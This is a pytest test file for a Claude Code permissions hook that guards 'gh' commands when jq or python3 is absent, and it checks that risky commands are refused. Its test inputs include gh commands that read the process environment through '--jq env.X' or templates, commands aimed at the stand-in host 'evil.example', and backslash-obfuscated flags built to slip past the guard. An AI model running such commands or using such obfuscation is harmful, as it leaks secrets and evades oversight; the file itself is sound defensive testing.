"""The permissions hook checks a gh command when jq is missing.

The hook reads its allow patterns with jq. Without jq, or when that read fails (a settings file that is
not valid JSON), it reads the command with python3, or from the event text when python3 is missing or
cannot read it, runs the gh read-guard as it does with jq, and approves nothing. The event text's escapes are
decoded left to right, an escaped backslash or quote as one character. A gh command the guard cannot check,
or one that matches its trigger but was read from the event text, is refused.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parent.parent
HOOK = _ROOT / "plugin-hooks" / "pretooluse-permissions.sh"
TOOLS = ("bash", "cat", "mkdir", "mv", "wc", "date", "sed", "dirname", "env")
ALLOW = ["Bash(gh pr list *)", "Bash(gh pr view *)", "Bash(ls *)"]

ENV_READ = "gh pr list --json number --jq env.X"  # a --jq expression that reads the process environment
HOST = "gh pr list -R evil.example/o/r --search x"  # a repository on a host other than github.com
CLEAN_TRIGGER = "gh pr list --json number --jq .title"  # a field read that matches the guard's trigger
NO_TRIGGER = "gh pr view 1"
# Guard shapes as the shell reads them: each puts a backslash, which the shell drops, before a letter of a
# flag or a verb. In the event's JSON each is an escaped backslash in front of an n, a t or an r.
BACKSLASHED = [
    "gh pr list --json number --\\repo evil.example/o/r --search x",
    "gh api --hos\\tname evil.example /user",
    "gh api --host\\name evil.example /user",
    "gh pr list --json number --\\template '{{env \"X\"}}'",
    "gh \\repo view evil.example/o/r",
]
UNREAD = "the gh read-guard could not read this command (python3 could not read the event)"


def _path(tmp_path: Path, *, jq: bool, python3: bool) -> str:
    """A PATH holding the tools the hook needs, with or without jq and python3."""
    bin_dir = tmp_path / f"bin-jq{int(jq)}-python{int(python3)}"
    if not bin_dir.exists():
        bin_dir.mkdir()
        for tool in TOOLS + (("jq",) if jq else ()) + (("python3",) if python3 else ()):
            src = shutil.which(tool)
            assert src, f"{tool} is not on this host"
            (bin_dir / tool).symlink_to(src)
    assert (shutil.which("jq", path=str(bin_dir)) is not None) == jq
    assert (shutil.which("python3", path=str(bin_dir)) is not None) == python3
    return str(bin_dir)


def _python3_whose_read_fails(tmp_path: Path) -> str:
    """A PATH like _path's with python3, whose python3 exits 1 for the hook's event read (python3 -I -c ...)
    and runs everything else with the real python3, the gh read-guard's decider included."""
    bin_dir = tmp_path / "bin-python3-read-fails"
    bin_dir.mkdir()
    for tool in TOOLS:
        (bin_dir / tool).symlink_to(shutil.which(tool))
    real = shutil.which("python3")
    assert real, "python3 is not on this host"
    (bin_dir / "python3").write_text(f'#!/bin/sh\n[ "$1" = -I ] && exit 1\nexec "{real}" "$@"\n')
    (bin_dir / "python3").chmod(0o755)
    return str(bin_dir)


def _run(tmp_path: Path, cmd: str, path: str, *, settings: str | None = None, tool: str = "Bash"):
    (tmp_path / ".claude").mkdir(exist_ok=True)
    (tmp_path / ".claude" / "settings.json").write_text(
        settings if settings is not None else json.dumps({"permissions": {"allow": ALLOW}})
    )
    return subprocess.run(
        ["bash", str(HOOK)],
        input=json.dumps({"tool_name": tool, "tool_input": {"command": cmd}}),
        capture_output=True, text=True, cwd=tmp_path, env={"HOME": str(tmp_path), "PATH": path}, timeout=20,
    )


def _hook(tmp_path: Path, cmd: str, path: str, *, settings: str | None = None, tool: str = "Bash") -> str:
    p = _run(tmp_path, cmd, path, settings=settings, tool=tool)
    return (
        "deny" if '"permissionDecision":"deny"' in p.stdout
        else "allow" if '"permissionDecision":"allow"' in p.stdout
        else "prompt"
    )


@pytest.mark.parametrize("cmd", [ENV_READ, HOST, f"echo ok && {ENV_READ}", f"echo ok\n{ENV_READ}"])
def test_without_jq_the_guard_still_denies(tmp_path, cmd):
    assert _hook(tmp_path, cmd, _path(tmp_path, jq=False, python3=True)) == "deny", cmd


@pytest.mark.parametrize("cmd", [CLEAN_TRIGGER, NO_TRIGGER, "ls -la"])
def test_without_jq_the_hook_approves_nothing(tmp_path, cmd):
    # The guard found it clear; with no allow pattern read, the hook leaves it to Claude Code's own check.
    assert _hook(tmp_path, cmd, _path(tmp_path, jq=False, python3=True)) == "prompt", cmd


@pytest.mark.parametrize(
    "cmd", [ENV_READ, CLEAN_TRIGGER, f"echo ok\n{ENV_READ}", 'gh pr list --json number --jq "env.X"']
)
def test_without_jq_or_python3_a_triggering_gh_command_is_refused(tmp_path, cmd):
    # The command is read from the event text, and the guard cannot run, so what its trigger matches is refused.
    assert _hook(tmp_path, cmd, _path(tmp_path, jq=False, python3=False)) == "deny", cmd


@pytest.mark.parametrize("cmd", [NO_TRIGGER, "ls -la"])
def test_without_jq_or_python3_an_untriggered_command_is_left_to_claude_code(tmp_path, cmd):
    assert _hook(tmp_path, cmd, _path(tmp_path, jq=False, python3=False)) == "prompt", cmd


@pytest.mark.parametrize("cmd", BACKSLASHED)
@pytest.mark.parametrize("jq", [True, False], ids=["jq", "python3"])
def test_a_shape_spelled_with_a_backslash_is_denied_when_read_exactly(tmp_path, cmd, jq):
    # jq, or python3 without jq, reads the command as written, and the guard's decider denies it.
    assert _hook(tmp_path, cmd, _path(tmp_path, jq=jq, python3=True)) == "deny", cmd


@pytest.mark.parametrize("cmd", BACKSLASHED)
def test_without_jq_or_python3_the_event_text_is_decoded_before_the_trigger_reads_it(tmp_path, cmd):
    # An escaped backslash stays one backslash, which the trigger drops as the shell does, so the trigger
    # reads the flag or verb gh gets, and the command is refused.
    assert _hook(tmp_path, cmd, _path(tmp_path, jq=False, python3=False)) == "deny", cmd


@pytest.mark.parametrize("cmd", [*BACKSLASHED, ENV_READ, CLEAN_TRIGGER])
def test_when_python3_cannot_read_the_event_a_triggering_command_is_refused(tmp_path, cmd):
    p = _run(tmp_path, cmd, _python3_whose_read_fails(tmp_path))
    out = json.loads(p.stdout)["hookSpecificOutput"]
    assert (out["permissionDecision"], out["permissionDecisionReason"]) == ("deny", UNREAD), p.stdout


def test_when_python3_cannot_read_the_event_an_untriggered_command_is_left_to_claude_code(tmp_path):
    path = _python3_whose_read_fails(tmp_path)
    for cmd in (NO_TRIGGER, "ls -la"):
        assert _hook(tmp_path, cmd, path) == "prompt", cmd


def test_the_python3_stand_in_fails_the_event_read_alone(tmp_path):
    # The stand-in is the real python3 for everything but the read: the decider runs under it and denies.
    py = str(Path(_python3_whose_read_fails(tmp_path)) / "python3")
    read = subprocess.run([py, "-I", "-c", "print(1)"], capture_output=True, text=True, timeout=20)
    decide = subprocess.run([py, "-B", str(_ROOT / "plugin-hooks" / "gh-guard-decide.py")], input=ENV_READ,
                            capture_output=True, text=True, timeout=20)
    assert (read.returncode, decide.returncode) == (1, 10), (read, decide)


def test_a_settings_file_jq_cannot_read_still_gets_the_guard(tmp_path):
    broken = json.dumps({"permissions": {"allow": ALLOW}})[:-2]  # cut short: not valid JSON
    path = _path(tmp_path, jq=True, python3=True)
    assert _hook(tmp_path, ENV_READ, path, settings=broken) == "deny"
    assert _hook(tmp_path, CLEAN_TRIGGER, path, settings=broken) == "prompt"


def test_without_jq_another_tool_is_left_alone(tmp_path):
    for python3 in (True, False):
        assert _hook(tmp_path, ENV_READ, _path(tmp_path, jq=False, python3=python3), tool="Read") == "prompt"


def test_the_setup_guide_lists_jq_and_python_as_required_software():
    text = (_ROOT / "SETUP_GUIDE.md").read_text(encoding="utf-8")
    required = text.split("### Required Software", 1)[1].split("###", 1)[0]
    names = {line.split("|")[1].strip() for line in required.splitlines() if line.startswith("| ")}
    assert {"jq", "Python"} <= names, names
